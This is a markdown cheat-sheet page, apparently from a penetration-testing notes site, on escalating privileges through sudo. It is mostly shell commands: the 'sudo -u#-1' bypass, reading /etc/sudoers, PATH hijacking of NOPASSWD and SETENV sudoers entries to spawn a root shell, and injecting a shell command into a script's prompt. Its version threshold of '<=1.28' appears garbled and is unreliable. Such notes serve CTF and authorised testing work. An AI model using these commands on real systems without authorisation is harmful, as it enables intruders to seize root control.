---
title: Sudo Privilege Escalation Basic
description: Sudo commands might be vulnerable to privilege escalation (PrivEsc).
tags:
    - Privilege Escalation
refs:
date: 2023-02-05
draft: false
---

## GTFOBins

[GTFOBins](https://gtfobins.github.io/) provides a wide variety of payloads to privilege escalation.  
So it's recommended to look for in there.

<br />

## Investigation

### Version

```sh
sudo --version
```

If the sudo **version <=1.28**, try the following command.

```sh
sudo -u#-1 /bin/bash
```

### As Another Users

```sh
sudo su root
sudo -u john whoami
# -s: run shell as target user
sudo -s
```

### Sudo commands (Sudoers)

```sh
sudo -l
sudo -ll

# Specify hostname
sudo -h <host-name> -l
# Execute via the hostname
sudo -h <host-name> /bin/bash
```

Also we might see from following files.

```sh
cat /etc/sudoers
cat /etc/sudoers.d/usersgroup
```

<br />

## Command Forgery (NOPASSWD)

If you are allowed to execute some command, you can forge the contents of the command.  
First off, check the properties.

```sh
sudo -l
(root) NOPASSWD: somecmd
```

If you can confirm that it can be executed as root without password, create the same named command in the arbitrary folder in which you can write files.

```sh
# option 1
echo /bin/sh > /tmp/somecmd
```

Next, change the permission for allowing to execute it.  
And add the path to the environment.

```sh
chmod +x /tmp/somecmd
export PATH=/tmp:$PATH
```

Now execute the command as root.  


```sh
sudo somecmd
whoami
# root
```

<br />

## Command Forgery (SETENV, NOPASSWD)

If you found there is a **SETENV:** in sudoers, you can set the **PATH** when running the command.

```sh
sudo -l
(root) SETENV: NOPASSWD: somecmd
```

As the previous section, prepare the payload.

```sh
echo '/bin/bash -p' > /tmp/somecmd
chmod +x /tmp/somecmd
```

Now run the command as root with setting the PATH.

```sh
sudo PATH=/tmp:$PATH somecmd
whoami
```

<br />

## Shell in Prompt

```bash
#!/bin/bash

read -p "What's you name: "
```

If we found there is another userâ€™s script which can be executed as root, you can input **\`/bin/bash -i\`** to get a shell as another user.
